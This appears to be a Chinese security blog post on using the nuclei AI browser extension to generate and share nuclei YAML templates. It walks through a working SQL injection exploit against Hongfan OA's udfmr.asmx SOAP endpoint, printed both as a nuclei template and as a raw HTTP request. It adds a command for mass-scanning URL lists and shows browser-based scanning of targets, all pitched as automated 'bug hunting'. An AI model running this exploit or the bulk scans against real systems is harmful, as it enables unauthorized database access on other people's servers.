#  nuclei+ai 解放双手，自动刷洞，同时poc共享！！   
 朱厌安全   2024-09-22 18:24  
  
# 背景  
> 之前在github上看到了nuclei新推出的一个浏览器插件，nuclei ai可以利用浏览器浏览器和ai直接对poc数据包生成合适的yaml文件，在星球内进行代shua poc的时候发现很多师傅不会写yaml，故写这篇文章，希望可以利用这个浏览器插件方便大家~~  
  
  
# 2. 项目地址  
> **项目地址：https://github.com/projectdiscovery/nuclei-ai-extension**  
  
**官方地址：https://cloud.projectdiscovery.io/template**  
  
  
  
# 3. 自动生成yaml+浏览器快捷检验  
> **在网上寻找相关的poc，并使用nuclei ai进行poc生成，同时再自己进行一些修改，即可**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US07CT5O0Vbh8IvJRqHXvSmaM8mib4ADaMgb3sUqkibJwYtojOJibia1N0HbQ/640?wx_fmt=png&from=appmsg "")  
> **最后得到的poc**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0CFW2FYBzfCrdp9xFaEbbqBL1sjeEt2K9Dy4ClVZaFt1XKUUiatOV6eg/640?wx_fmt=png&from=appmsg "null")  
```
id: hongfansql

info:
  name: 红帆oa Sql注入
  author: fkalis
  severity: high
  reference: https://blog.csdn.net/qq_41904294/article/details/132365842

http:
  - method: POST
    path:
      - "{{BaseURL}}/iOffice/prg/set/wss/udfmr.asmx"

    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"

    body: |      <?xml version="1.0" encoding="utf-8"?>      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">        <soap:Body>          <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">            <condition>1=user_name()</condition>          </GetEmpSearch>        </soap:Body>      </soap:Envelope>    matchers:
      # Add your desired matcher(s) here, for example:
      - type: word
        words:
          - "SqlException"
        part: body
      - type: status
        status:
          - 500
```  
> **tips：在运行poc的时候可能会遇到报错，可以使用-validate 对报错进行查看**  
  
  
**有错误：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0Kiacyjceib1ZhUh73yBO5uVjdK7Xy8LBDaVwicDQRV4224vorgntfvveQ/640?wx_fmt=png&from=appmsg "")  
  
**修改后：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0m82woRibty5exXoP4xlxJpv34YqxR70vKSB8uRsBQS2ILURLRj3KJiaw/640?wx_fmt=png&from=appmsg "")  
# 运行poc查看效果  
> **nuclei -t "hongfan Sql注入.yaml" -l url.txt -v**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0BGKiaWibKNd6S35MWN4kF1Q0ibY001zGx7b6ohVXhdHGFz3S2HE2uS8xQ/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现检验  
```
POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
Host: your-ip
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
      <condition>1=user_name()</condition>
    </GetEmpSearch>
  </soap:Body>
</soap:Envelope>
```  
  
http://xxx.xxx.xxxx:9980/ioffice/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0t2zdEiaDlrAbnYbUnp8VrY5xn2ljYFZO9YbZPwYqo51Yr1UXXOC8qwQ/640?wx_fmt=png&from=appmsg "")  
  
执行poc：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0byficaxWfndAGfVNfkL9GJUoVScQciafTr5iaqnfrtNJuDWMQkneAfW3Q/640?wx_fmt=png&from=appmsg "")  
# 使用浏览器进行快捷漏洞检验  
> **打开poc列表**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0qFjtF7EPdQyE72vgIfHDFbX7A0bIJUgWPuKcY7HxPTGD09QxmCUDXg/640?wx_fmt=png&from=appmsg "")  
> **选中刚刚的写好的poc，或者网上的poc**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0N6KVicJ7UiaJeVOROwIpibqyy77NZeDgccp2pA88HXd8HrBdbq6hTgEkA/640?wx_fmt=png&from=appmsg "")  
> **将目标站点放在target中，并点击scan**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0TaKOicPUdUCfGh1e6ClYbWg7pbSOJy8x8P8h6ygI4n2JaiaZib7jCqzsQ/640?wx_fmt=png&from=appmsg "")  
> **可以看见攻击的请求和响应判断攻击是否成功**  
  
  
请求包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0NEwzia55BUPYfkibhjZBRBlpQ1iatxOTxkhQPPZicxD9RrPAPypwHHZ2YA/640?wx_fmt=png&from=appmsg "")  
  
响应包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US047icgevqag2Abm40oy1q0NRic4KmR1J7qtHOCpPwrJ0FZwd0nPFDwWLQ/640?wx_fmt=png&from=appmsg "")  
  
# 3. nuclei ai poc分享  
  
**支持对自己编写的poc进行连接分享**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0NluqzxZk2MCdUHXM4rqQD3rlxy2TCVbZBOtFhibFQw4WurPk2KicwfxA/640?wx_fmt=png&from=appmsg "")  
  
**访问分享的连接即可获取到poc**  
> https://cloud.projectdiscovery.io/xxx.xxx  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0HoPqCldsicaotiarZlibDMjqMib511HFg0fYRPlicywwg5l0WBLDl2IjJnQ/640?wx_fmt=png&from=appmsg "")  
  
**当然也可以关闭对poc的分享**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicf0Mc8VFib4pOOMjfKs52US0kRSmic3nVwS3NZGVW3PCgpJvvd2v7ZaF4aK9fnolicnfem6EW73BahRA/640?wx_fmt=png&from=appmsg "")  
  
  
